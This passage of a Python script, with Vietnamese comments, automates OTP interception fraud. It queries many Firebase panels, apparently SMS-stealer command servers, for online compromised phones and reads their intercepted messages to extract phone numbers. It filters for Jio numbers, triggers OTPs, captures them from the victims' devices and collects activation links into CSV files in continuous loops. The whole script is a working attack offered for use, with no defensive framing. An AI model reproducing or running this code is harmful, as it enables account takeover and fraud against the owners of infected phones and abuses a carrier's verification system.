    for _ in range(10):
        try:
            with file_lock:
                exists = RESULTS_FILE.exists() and RESULTS_FILE.stat().st_size > 0
                with RESULTS_FILE.open("a", newline="", encoding="utf-8") as handle:
                    writer = csv.DictWriter(handle, fieldnames=RESULT_FIELDS)
                    if not exists:
                        writer.writeheader()
                    writer.writerow({
                        "serial_number": serial,
                        "device_id": device_id,
                        "mobile_number": mobile,
                        "status": status,
                        "activation_url": url,
                        "nepal_date": now.strftime("%Y-%m-%d"),
                        "nepal_time": now.strftime("%I:%M:%S %p"),
                    })
            break
        except Exception:
            time.sleep(0.1)

# ==================== MAIN ====================

def main() -> int:
    t_start = time.time()
    print("=" * 70)
    print(f"BƯỚC 1: Quét {len(FIREBASE_PANELS)} panels song song (35 luồng)...")
    print("=" * 70)
    t0 = time.time()
    
    all_online_devices: dict[str, dict[str, Any]] = {}
    panel_lock = threading.Lock()

    def check_one_panel(item: tuple[int, tuple[str, str]]):
        panel_idx, (base_url, firebase_key) = item
        firebase = firebase_session()
        try:
            if firebase_key and firebase_key.startswith("http"):
                response = firebase.get(f"{base_url}/clients.json", timeout=5)
            else:
                response = firebase.get(f"{base_url}/clients.json?auth={firebase_key}", timeout=5)
            
            if response.status_code == 200:
                clients = response.json()
                if isinstance(clients, dict):
                    online_devices = {}
                    for device_id, data in clients.items():
                        if isinstance(data, dict) and data.get("status") is True:
                            online_devices[device_id] = {
                                "base_url": base_url,
                                "firebase_key": firebase_key,
                                "firebase_session": firebase,
                                "data": data,
                            }
                    if online_devices:
                        with panel_lock:
                            all_online_devices.update(online_devices)
                        print(f" [Panel {panel_idx:03d}] {base_url} -> {len(online_devices)} online")
        except Exception:
            pass

    import random
    panel_items = list(enumerate(FIREBASE_PANELS, start=1))
    random.shuffle(panel_items)  # Xao tron de khi mo nhieu CMD, moi CMD quet cac panel khac nhau

    with concurrent.futures.ThreadPoolExecutor(max_workers=35) as executor:
        list(executor.map(check_one_panel, panel_items))

    print(f"\n-> Bước 1 hoàn tất trong {time.time() - t0:.1f}s | Tổng online devices: {len(all_online_devices)}")
    if not all_online_devices:
        print("Không tìm thấy thiết bị online nào.")
        return 1
    
    # BƯỚC 2: Trích xuất số điện thoại
    print("\n" + "=" * 70)
    print(f"BƯỚC 2: Trích xuất số điện thoại từ {len(all_online_devices)} thiết bị (50 luồng)...")
    print("=" * 70)
    t0 = time.time()

    device_messages: dict[str, dict[str, dict[str, Any]]] = {}
    mappings: dict[str, set[str]] = defaultdict(set)
    msg_lock = threading.Lock()

    def fetch_device(item: tuple[str, dict[str, Any]]):
        device_id, info = item
        try:
            messages = latest_messages(
                info["firebase_session"],
                info["base_url"],
                info["firebase_key"],
                device_id,
                MESSAGE_SCAN_LIMIT,
            )
            mobiles = number_candidates(messages)
            with msg_lock:
                device_messages[device_id] = messages
                for mobile in mobiles:
                    mappings[mobile].add(device_id)
        except Exception:
            with msg_lock:
                device_messages[device_id] = {}

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        list(executor.map(fetch_device, all_online_devices.items()))

    targets: list[tuple[str, str]] = []
    for mobile, devices in sorted(mappings.items()):
        if devices:
            targets.append((sorted(devices)[0], mobile))

    print(f"-> Bước 2 hoàn tất trong {time.time() - t0:.1f}s | Tổng số ứng viên: {len(targets)}")
    if not targets:
        print("Không tìm thấy số điện thoại nào.")
        return 1

    # BƯỚC 3.1: Lọc nhanh số mạng Jio (Pre-filter Jio Numbers in Parallel)
    print("\n" + "=" * 70)
    print(f"BƯỚC 3.1: Lọc nhanh mạng Jio từ {len(targets)} số ứng viên (30 luồng)...")
    print("=" * 70)
    t0 = time.time()

    jio_targets: list[tuple[str, str]] = []
    statuses: Counter[str] = Counter()
    jio_lock = threading.Lock()

    def filter_jio(item: tuple[int, tuple[str, str]]):
        serial, (device_id, mobile) = item
        info = all_online_devices.get(device_id)
        if not info:
            return
        device = info.get("data")
        if not isinstance(device, dict) or device.get("status") is not True:
            with jio_lock:
                statuses["device_offline"] += 1
            save_result(serial, device_id, mobile, "device_offline", "")
            return

        jio = jio_session()
        jio_check = is_jio_number(jio, mobile)
        if jio_check is False:
            with jio_lock:
                statuses["not_jio_number"] += 1
            save_result(serial, device_id, mobile, "not_jio_number", "")
        else:
            with jio_lock:
                jio_targets.append((device_id, mobile))
            tag = "[V] SỐ JIO" if jio_check is True else "[?] SỐ TIỀM NĂNG"
            print(f" {tag}: {mobile} (Device: {device_id[:15]}...)")

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        list(executor.map(filter_jio, enumerate(targets, start=1)))

    print(f"\n-> Bước 3.1 hoàn tất trong {time.time() - t0:.1f}s | Tìm thấy {len(jio_targets)} số Jio hợp lệ (Đã loại {statuses['not_jio_number']} số không phải Jio)!")

    # BƯỚC 3.2: Gửi OTP và Kích Hoạt cho các số Jio hợp lệ (6 luồng song song)
    if not jio_targets:
        print("\nKhông có số Jio nào khả dụng trong vòng quét này.")
    else:
        print("\n" + "=" * 70)
        print(f"BƯỚC 3.2: Gửi OTP và Lấy Link Kích Hoạt cho {len(jio_targets)} số Jio (6 luồng)...")
        print("=" * 70)
        t0 = time.time()

        def process_one_jio(item: tuple[int, tuple[str, str]]):
            sub_idx, (device_id, mobile) = item
            info = all_online_devices.get(device_id)
            if not info:
                return
            base_url = info["base_url"]
            firebase_key = info["firebase_key"]
            firebase = info["firebase_session"]

            print(f"\n>>> [{sub_idx}/{len(jio_targets)}] Gửi OTP: {mobile} | Device: {device_id[:15]}...")
            jio = jio_session()
            known_keys = set(device_messages.get(device_id, {}))
            otp_result = send_otp(jio, mobile)

            if otp_result == "locked":
                status, url = "otp_locked_retry_later", ""
            elif otp_result != "ok":
                status, url = "otp_send_failed", ""
            elif not wait_for_otp(firebase, base_url, firebase_key, device_id, known_keys, jio, mobile):
                status, url = "otp_failed", ""
            else:
                status, url = get_activation(jio)

            with jio_lock:
                statuses[status] += 1
            save_link(url)
            save_result(f"JIO-{sub_idx}", device_id, mobile, status, url)

            if url:
                print(f"\n{'='*70}\n[THÀNH CÔNG] {mobile} -> LINK: {url}\n{'='*70}")
            else:
                print(f"--- Kết quả {mobile}: {status}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
            list(executor.map(process_one_jio, enumerate(jio_targets, start=1)))

        print(f"\n-> Bước 3.2 hoàn tất trong {time.time() - t0:.1f}s!")

    print("\n" + "=" * 70)
    print(f"TỔNG KẾT VÒNG QUÉT (Tổng thời gian: {time.time() - t_start:.1f}s)")
    print("=" * 70)
    print(f"Tổng thiết bị online : {len(all_online_devices)}")
    print(f"Tổng số ứng viên     : {len(targets)}")
    print(f"Số Jio hợp lệ        : {len(jio_targets)}")
    for status, count in sorted(statuses.items()):
        print(f"{status:25}: {count}")
    print(f"\nLinks file : {LINKS_FILE.resolve()}")
    print(f"Results file : {RESULTS_FILE.resolve()}")
    return 0

if __name__ == "__main__":
    import sys
    max_loops_cfg = int(os.environ.get("MAX_LOOPS", "0"))
    max_run_mins  = int(os.environ.get("MAX_RUN_MINUTES", "0"))
    t_script_start = time.time()
    loop_count = 0

    while True:
        if max_loops_cfg > 0 and loop_count >= max_loops_cfg:
            print(f"\n[CI/CD] Da hoan thanh {loop_count} vong quet theo cau hinh MAX_LOOPS.")
            break
        if max_run_mins > 0 and (time.time() - t_script_start) >= max_run_mins * 60:
            print(f"\n[CI/CD] Da dat thoi gian chay {max_run_mins} phut, ban giao cho phien tiep theo.")
            break
        loop_count += 1
        print("\n" + "#" * 70)
        print(f"  VONG {loop_count} - {datetime.now(ZoneInfo('Asia/Ho_Chi_Minh')).strftime('%Y-%m-%d %H:%M:%S')} ICT")
        print("#" * 70)

        try:
            main()
        except KeyboardInterrupt:
            print("\nDung boi nguoi dung.")
            _shutdown_chrome()
            sys.exit(0)
        except Exception as e:
            print(f"[ERROR] Vong {loop_count} gap loi: {e}")

        try:
            current_links = len(LINKS_FILE.read_text(encoding="utf-8").splitlines()) if LINKS_FILE.exists() else 0
        except Exception:
            current_links = 0

        print(f"\n[LOOP] Tong link da co: {current_links} | Bat dau vong {loop_count + 1} ngay...")